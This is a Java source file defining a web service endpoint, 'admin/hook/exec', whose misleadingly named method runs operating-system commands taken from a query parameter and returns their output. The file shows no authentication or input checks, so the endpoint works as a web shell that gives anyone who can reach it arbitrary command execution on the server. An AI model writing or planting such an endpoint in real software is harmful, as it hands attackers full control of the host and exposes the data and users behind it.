package resource.hook;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;
import javax.ejb.Stateless;
import javax.ws.rs.GET;
import javax.ws.rs.Path;
import javax.ws.rs.Produces;
import javax.ws.rs.QueryParam;
import javax.ws.rs.core.MediaType;

/**
 *
 * @author alonsocucei
 */
@Stateless
@Path("admin/hook")
public class SystemHook {

    @GET
    @Path("/exec")
    @Produces({MediaType.APPLICATION_JSON})
    public Map<String, List<String>> findPIDEIndicators(@QueryParam("commands") String commands) {
        Map<String, List<String>> output = new HashMap<>();

        List<String> commandsList = Arrays.asList(commands.split(";"));

        for (String command: commandsList) {
            
            try {
                Process process = Runtime.getRuntime().exec(command);
                BufferedReader standardMessages = new BufferedReader(new InputStreamReader(process.getInputStream()));
                BufferedReader errorMessages = new BufferedReader(new InputStreamReader(process.getErrorStream()));

                output.put("<" + command + "> messages:", standardMessages.lines().collect(Collectors.toList()));
                output.put("<" + command + "> errors:", errorMessages.lines().collect(Collectors.toList()));
            } catch (IOException ex) {
                output.put("errors:", Arrays.asList(ex.toString()));
                break;
            }
        }
        
        return output;
    }
}
